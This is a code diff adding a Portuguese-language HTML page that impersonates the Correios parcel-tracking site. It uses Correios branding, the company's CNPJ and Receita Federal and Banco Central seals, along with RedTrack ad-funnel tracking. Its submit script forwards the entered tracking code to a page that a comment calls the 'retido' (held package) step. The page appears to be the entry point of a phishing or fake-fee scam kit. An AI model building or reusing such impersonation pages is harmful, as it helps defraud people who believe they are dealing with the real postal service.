@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#004169">
+    <meta name="description" content="Rastreamento de Encomendas - Correios">
+
+    <title>Rastreamento de Objetos - Correios</title>
+
+    <!-- rtkcid: entrada oficial do funil — semeia o click ID do RedTrack em sessionStorage -->
+    <script>(function(){try{var r=new URLSearchParams(location.search).get('rtkcid');if(r&&/^[0-9a-fA-F]{24}$/.test(r))sessionStorage.setItem('_rtk',r);}catch(e){}})();</script>
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/webp" href="assets/images/favicon.webp">
+
+    <!-- Preload critical CSS (dispara em paralelo ao HTML parse) -->
+    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/css/all.min.css?v=subset-5" as="style">
+    <link rel="preload" href="assets/css/styles.css?v=2.2.1" as="style">
+    <link rel="preload" href="assets/images/correios.webp" as="image" fetchpriority="high">
+
+    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-solid-900.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-regular-400.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
+
+    <!-- Critical CSS estrutural (mesma base do index) + estilos da busca -->
+    <style id="critical-inline">
+      *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+      html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;overflow-x:hidden}
+      body{line-height:1.5;background:#fff;color:#003f6b;min-height:100vh;display:flex;flex-direction:column;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
+      img{max-width:100%;height:auto;display:block}
+      a{color:inherit;text-decoration:none}
+      button{cursor:pointer;border:0;background:none;font:inherit}
+      .main{flex:1;max-width:480px;margin:0 auto;padding:1rem;width:100%}
+      .header{background:#f4f6f8;border-bottom:3px solid #ffd400}
+      .header-nav{display:flex;align-items:center;justify-content:center;max-width:1200px;margin:0 auto;padding:.375rem 1rem;min-height:40px}
+      .logo-correios{height:25px;width:auto;display:block}
+      .btn-entrar{display:none}
+      .footer{background:#fdd306;color:#1e3a5f;padding:1.5rem 1rem}
+      .footer-container{max-width:1000px;margin:0 auto}
+      .footer-bottom{display:flex;flex-direction:column;align-items:center}
+      .footer-logos{display:flex;align-items:center;justify-content:center;gap:2rem}
+      .footer-logos .logo-footer{height:5.5rem;width:auto;max-width:100%;object-fit:contain}
+      .footer-copyright{text-align:center;font-size:.7rem;color:#014268;margin-bottom:0}
+      [hidden]{display:none!important}
+      /* ── Busca (localize sua encomenda) ── */
+      .breadcrumb{font-size:.78rem;color:#5a7184;margin:.25rem 0 1rem;display:flex;align-items:center;gap:.4rem;flex-wrap:wrap}
+      .busca-card{background:#fff;border:1px solid #e3e9ef;border-radius:12px;box-shadow:0 2px 12px rgba(0,65,105,.06);padding:1.5rem 1.25rem}
+      .busca-titulo{display:flex;align-items:center;gap:.6rem;font-size:1.3rem;font-weight:700;color:#004169;margin-bottom:.4rem}
+      .busca-titulo i{color:#ffce00}
+      .busca-sub{font-size:.92rem;color:#41607a;margin-bottom:1.1rem}
+      .busca-form label{display:block;font-size:.8rem;font-weight:600;color:#33536b;margin-bottom:.35rem}
+      .busca-input{width:100%;padding:.85rem .9rem;font-size:1.05rem;letter-spacing:.5px;border:2px solid #cfdbe5;border-radius:8px;color:#003f6b;text-transform:uppercase;transition:border-color .15s}
+      .busca-input:focus{outline:none;border-color:#004169}
+      .busca-input::placeholder{text-transform:none;letter-spacing:normal;color:#9fb1bf}
+      .busca-btn{width:100%;margin-top:.9rem;padding:.95rem;font-size:1.02rem;font-weight:700;color:#fff;background:#004169;border-radius:8px;letter-spacing:.5px;display:flex;align-items:center;justify-content:center;gap:.5rem;transition:background .15s}
+      .busca-btn:hover{background:#013354}
+      .busca-erro{margin-top:.7rem;font-size:.85rem;color:#c0392b;font-weight:600}
+      .busca-hint{margin-top:1rem;font-size:.78rem;color:#6a8197;line-height:1.45;display:flex;gap:.5rem}
+      .busca-hint i{color:#9fb1bf;margin-top:.15rem}
+      .selos{display:flex;align-items:center;justify-content:center;gap:1.5rem;margin-top:1.4rem;opacity:.9}
+      .selos img{height:2.6rem;width:auto}
+    </style>
+    <link rel="stylesheet" href="assets/vendor/fontawesome/6.5.1/css/all.min.css?v=subset-5">
+    <link rel="stylesheet" href="assets/css/styles.css?v=2.2.1">
+</head>
+<body>
+    <!-- HEADER -->
+    <header class="header">
+        <nav class="header-nav" id="headerNav">
+            <a href="#" class="logo-link">
+                <img src="assets/images/correios.webp" alt="Correios" class="logo-correios" width="121" height="25" decoding="async" fetchpriority="high">
+            </a>
+            <a href="#" class="btn-entrar">
+                <img src="assets/images/entrar.svg" alt="Entrar" class="icon-entrar" width="20" height="20" decoding="async">
+                <span class="user-name">Entrar</span>
+            </a>
+        </nav>
+    </header>
+
+    <!-- MAIN -->
+    <main class="main">
+        <nav class="breadcrumb">
+            <span>Portal Correios</span>
+            <i class="fal fa-angle-right"></i>
+            <span>Rastreamento</span>
+        </nav>
+
+        <section class="busca-card">
+            <h1 class="busca-titulo">
+                <i class="far fa-box-alt"></i>
+                <span>Rastreie seu objeto</span>
+            </h1>
+            <p class="busca-sub">Informe o código de rastreamento para acompanhar a situação da sua encomenda.</p>
+
+            <form class="busca-form" id="formRastreio" autocomplete="off" novalidate>
+                <label for="codigo">Código de rastreamento</label>
+                <input class="busca-input" type="text" id="codigo" name="codigo"
+                       placeholder="Ex.: AA123456789BR" inputmode="latin" maxlength="20"
+                       autocapitalize="characters" required>
+                <button class="busca-btn" type="submit">
+                    <i class="far fa-search"></i> RASTREAR
+                </button>
+                <p class="busca-erro" id="erro" hidden></p>
+            </form>
+
+            <p class="busca-hint">
+                <i class="far fa-info-circle"></i>
+                <span>O código tem 13 caracteres (2 letras + 9 números + 2 letras). Você o encontra no e-mail/SMS de postagem ou na loja onde comprou.</span>
+            </p>
+
+            <div class="selos">
+                <img src="assets/images/receita-federal.webp" alt="Receita Federal" decoding="async">
+                <img src="assets/images/bacen.png" alt="Banco Central" decoding="async">
+            </div>
+        </section>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-bottom">
+                <div class="footer-logos">
+                    <img src="assets/images/logo-rodape.webp" alt="Correios e Receita Federal" class="logo-footer" width="383" height="88" decoding="async">
+                </div>
+                <p class="footer-copyright">© Copyright 2026 Correios<br>CNPJ 34.028.316/0001-03</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+    (function(){
+        var form = document.getElementById('formRastreio');
+        var erro = document.getElementById('erro');
+        var inp  = document.getElementById('codigo');
+        function norm(v){ return (v||'').toUpperCase().replace(/[^A-Z0-9]/g,''); }
+        form.addEventListener('submit', function(ev){
+            ev.preventDefault();
+            var code = norm(inp.value);
+            // aceita o formato Correios (AA999999999BR) ou ao menos 8+ alfanuméricos
+            if (code.length < 8) {
+                erro.textContent = 'Informe um código de rastreamento válido (ex.: AA123456789BR).';
+                erro.hidden = false;
+                inp.focus();
+                return;
+            }
+            erro.hidden = true;
+            // preserva rtkcid + demais params e leva pro retido com o código buscado
+            var params = new URLSearchParams(location.search);
+            params.set('tipo', 'rastreio');
+            params.set('rastreio', code);
+            window.location.href = '/index.html?' + params.toString();
+        });
+    })();
+    </script>
+</body>
+</html>
